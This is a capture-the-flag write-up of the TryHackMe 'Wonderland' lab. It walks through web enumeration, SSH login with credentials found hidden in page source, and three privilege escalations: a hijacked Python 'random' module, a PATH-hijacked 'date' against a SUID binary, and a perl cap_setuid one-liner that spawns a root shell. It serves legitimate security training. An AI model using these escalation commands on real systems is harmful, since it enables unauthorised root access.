# CTF Writeup — Wonderland

## 📌 Overview

* **Platform:** TryHackMe
* **Difficulty:** Medium
* **Objective:** Capture user flag and root flag (full compromise)

Wonderland is an Alice in Wonderland–themed Linux machine that chains together multiple privilege escalation techniques across several user accounts. The engagement begins with web content discovery, progresses through credential exposure in a hidden HTML element, and escalates privileges three times — via Python library hijacking, PATH manipulation against a SUID binary, and Linux capabilities abuse — before achieving root access.

---

## 🔍 Enumeration

### 1. Initial Reconnaissance

Port scanning was performed using RustScan with aggressive service detection to identify open ports and running services.

```bash
rustscan -a 10.66.145.127 -- -A
```

**Results:**

| Port | Service |
|------|---------|
| 22 | SSH |
| 80 | HTTP (Go-based web server) |

Two attack surfaces were identified: an SSH service and a web application.

---

### 2. Web Application Enumeration

Inspection of the web application at port 80 revealed a themed landing page titled *"Follow the White Rabbit."* The page source referenced an image at `/img/white_rabbit_1.jpg`, prompting enumeration of the `/img` directory, which returned a directory listing containing three image files — potential candidates for steganography.

Before pursuing steganography, directory fuzzing was performed to identify additional paths.

```bash
ffuf -u "http://10.66.145.127/FUZZ" -w /usr/share/wordlists/dirb/common.txt
```

**Identified paths:** `/img`, `/index.html`, `/r`

The `/r` endpoint returned a page reading *"Keep Going,"* suggesting a path-based pattern. Recursive fuzzing was applied:

```bash
ffuf -u "http://10.66.145.127/r/FUZZ" -w /usr/share/wordlists/dirb/common.txt
```

The `/r/a` path was discovered. Recognising that the path segments spelled out **r-a-b-b-i-t**, the full path `http://10.66.145.127/r/a/b/b/i/t/` was tested directly without further recursive fuzzing — saving significant time.

**Discovery at `/r/a/b/b/i/t/`:**

The final page in the sequence contained a hidden paragraph element in the HTML source:

```html
alice:HowDothTheLittleCrocodileImproveHisShiningTail
```

The format `alice:HowDothTheLittleCrocodileImproveHisShiningTail` was identified as a potential username:password pair for SSH access.

---

## 💥 Exploitation

**Vulnerability:** Credentials exposed in client-side HTML source (hidden element)  
**Location:** `http://10.66.145.127/r/a/b/b/i/t/` — `display: none` paragraph  
**Impact:** Unauthenticated access to the system as user `alice`

The discovered credentials were used to authenticate directly via SSH:

```bash
ssh alice@10.66.145.127
# Password: HowDothTheLittleCrocodileImproveHisShiningTail
```

Initial access as `alice` was confirmed. The home directory contained `root.txt` (owned by root, unreadable) and `walrus_and_the_carpenter.py`.

---

## 🔓 Privilege Escalation

### Stage 1: alice → rabbit (Python Library Hijacking)

**Local Enumeration**

```bash
sudo -l
```

`alice` was permitted to execute a specific Python script as the `rabbit` user:
(rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py

**Identified Vector:** Python library hijacking via `import random`

The script imported the `random` module without an absolute path, making it vulnerable to hijacking. Python resolves imports by searching the current working directory before system paths. A malicious `random.py` was created in `/home/alice/`:

```bash
echo 'import os; os.system("/bin/bash")' > /home/alice/random.py
```

**Escalation:**

```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

A shell was spawned as `rabbit`.

---

### Stage 2: rabbit → hatter (PATH Hijacking via SUID Binary)

**Identified Vector:** SUID binary calling `date` without an absolute path

```bash
find / -perm -4000 2>/dev/null
```

A non-standard SUID binary was identified at `/home/rabbit/teaParty`. Strings within the binary revealed the following command:
/bin/echo -n 'Probably by ' && date --date='next hour' -R

The `date` binary was called without its full path. By injecting a malicious `date` binary into `/tmp` and prepending `/tmp` to the `PATH` environment variable, the SUID binary was made to execute the controlled payload instead.

**Escalation:**

```bash
echo '/bin/bash' > /tmp/date
chmod +x /tmp/date
export PATH=/tmp:$PATH
/home/rabbit/teaParty
```

A shell was obtained as `hatter`. The home directory contained `password.txt`:
WhyIsARavenLikeAWritingDesk?

`sudo -l` confirmed that `hatter` had no sudo privileges.

---

### Stage 3: hatter → root (Linux Capabilities — cap_setuid)

**Identified Vector:** `perl` binary with `cap_setuid` capability

```bash
getcap -r / 2>/dev/null
```

**Results:**
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/perl = cap_setuid+ep

The `cap_setuid` capability allows a process to arbitrarily set its UID. This was abused to set UID to 0 (root) and spawn a privileged shell, using the GTFOBins technique for `perl` capabilities:

```bash
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

Root access was confirmed.

**Flag retrieval:**

```bash
cat /home/alice/root.txt
# thm{-----}

cat /root/user.txt
# thm{--------}
```

> **Note:** In this room, the flags are intentionally inverted — `root.txt` is in `/home/alice` and `user.txt` is in `/root`.

---

## 🧠 Lessons Learned

- **Enumerate web content methodically before assuming complexity.** The critical credentials were hidden in plain sight in an HTML element with `display: none`. A quick view of page source yielded initial access before any deeper exploitation was needed.
- **Path-based pattern recognition saves time.** Recognising that `/r/a/b/b/i/t/` spelled "rabbit" allowed the full path to be tested directly rather than running recursive fuzzing at every level — an important efficiency habit.
- **Python's import resolution order is a well-known but easy-to-miss attack surface.** When a script imports a module by short name and is run with elevated privileges (`sudo -u`), placing a malicious module in the working directory is often sufficient for hijacking. Always check `import` statements when reviewing scripts associated with sudo rules.
- **SUID binaries that call system utilities without absolute paths are reliably exploitable.** Auditing binary strings with `strings` or `cat` is a fast technique to identify this class of vulnerability before investing time in reverse engineering.
- **Linux capabilities are a subtle and often overlooked privilege escalation vector.** `sudo -l` and SUID checks alone are insufficient — `getcap -r /` should be part of every post-exploitation enumeration checklist.
- **The flag placement inversion in this room reflects a real-world principle:** assumptions about where sensitive files reside can lead to overlooking them. Always search broadly.

---

## 🧩 Tools Used

* **RustScan** — fast port scanning with Nmap integration
* **ffuf** — web directory and path fuzzing
* **SSH** — remote access
* **find** — SUID binary enumeration
* **getcap** — Linux capability enumeration
* **GTFOBins** — reference for capability and SUID exploitation techniques
* **Perl** — capability abuse for privilege escalation

---

## ⚠️ Notes

* Flags are intentionally omitted from this writeup.
* This writeup focuses on methodology, reasoning, and lessons learned.

---
